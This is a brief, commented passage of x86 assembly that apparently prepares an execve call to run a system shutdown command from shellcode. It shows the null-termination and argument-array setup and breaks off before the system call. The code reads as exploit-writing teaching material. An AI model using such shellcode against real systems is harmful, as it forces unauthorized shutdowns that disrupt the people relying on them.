...
shutdown:
	pop ebx             ;Pop command string address into ebx
	xor eax, eax	    ;Set eax to 0 in preparation for null-termination
	mov [ebx+14], al    ;Null-terminate command string
	mov [ebx+16], eax   ;Null-terminate extra "0" parameter string
	mov [ebx+20], ebx   ;First argument in argument array (and first parameter) for execve is pointer to command string
	lea edx, [ebx+15]   ;Load address of "0" string into edx
